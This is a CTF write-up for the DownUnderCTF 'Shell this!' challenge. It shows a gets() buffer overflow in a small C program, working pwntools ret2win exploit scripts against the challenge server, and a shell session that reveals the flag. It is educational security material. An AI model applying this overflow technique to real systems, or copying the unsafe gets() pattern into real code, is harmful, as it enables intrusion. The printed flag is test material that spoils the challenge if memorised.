# DownUnderCTF

## Shell this!

> 100
>
> Author: Faith
>
> Somebody told me that this program is vulnerable to something called remote code execution?
>
> I'm not entirely sure what that is, but could you please figure it out for me?
>
> `nc chal.duc.tf 30002`
>
> Attached files:
>
>    * [shellthis.c](shellthis.c) (sha256: 82c8a27640528e7dc0c907fcad549a3f184524e7da8911e5156b69432a8ee72c)
>    * [shellthis](shellthis) (sha256: af6d30df31f0093cce9a83ae7d414233624aa8cf23e0fd682edae057763ed2e8)



Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _bof_ _ret2win_


## Summary

`gets`


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No shellcode, but that's about it.


### Source included


```c
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
void setup() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void get_shell() {
    execve("/bin/sh", NULL, NULL);
}

void vuln() {
    char name[40];

    printf("Please tell me your name: ");
    gets(name);
}

int main(void) {
    printf("Welcome! Can you figure out how to get this program to give you a shell?\n");
    vuln();
    printf("Unfortunately, you did not win. Please try again another time!\n");
}
```

`gets` vulnerability.  Easy ROP/_ret2win_ since no canary or PIE.


## Exploit

```
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./shellthis')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.duc.tf', 30002)

payload  = 0x38 * b'A'
payload += p64(binary.sym.get_shell)

p.sendlineafter('Please tell me your name: ',payload)
p.interactive()
```

Send `0x38` bytes followed by the address of the `get_shell` function.

### Why `0x38`?

Well, it's the distance to the return address from the start of the `name` buffer.

There are two easy ways to figure this out:

Use Ghidra and look at the stack diagram:

```
                               undefined __stdcall vuln(void)
             undefined         AL:1               <RETURN>
             char[40]          Stack[-0x38]:40    name
```

Or, have pwntools find it for you:

```
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./shellthis')
context.log_level = 'INFO'

p = process(binary.path)
p.sendline(cyclic(1024,n=8))
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
offset = cyclic_find(core.read(core.rsp, 8),n=8)
log.info('offset: ' + hex(offset))

p = remote('chal.duc.tf', 30002)

payload  = offset * b'A'
payload += p64(binary.sym.get_shell)

p.sendlineafter('Please tell me your name: ',payload)
p.interactive()
```


Output:

```
# ./exploit2.py
[*] '/pwd/datajerk/downunderctf2020/shellthis/shellthis'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/pwd/datajerk/downunderctf2020/shellthis/shellthis': pid 29206
[*] Process '/pwd/datajerk/downunderctf2020/shellthis/shellthis' stopped with exit code -11 (SIGSEGV) (pid 29206)
[!] Found bad environment at 0x7ffe62945f8c
[+] Parsing corefile...: Done
[*] '/pwd/datajerk/downunderctf2020/shellthis/core.29206'
    Arch:      amd64-64-little
    RIP:       0x400713
    RSP:       0x7ffe62944bb8
    Exe:       '/pwd/datajerk/downunderctf2020/shellthis/shellthis' (0x400000)
    Fault:     0x6161616161616168
[*] offset: 0x38
[+] Opening connection to chal.duc.tf on port 30002: Done
[*] Switching to interactive mode
$ id
uid=1000 gid=999 groups=999
$ ls -l
total 16
-rw-r--r-- 1 65534 65534    43 Sep  4 04:31 flag.txt
-rwxr-xr-x 1 65534 65534 11488 Sep  4 04:31 shellthis
$ cat flag.txt
DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
```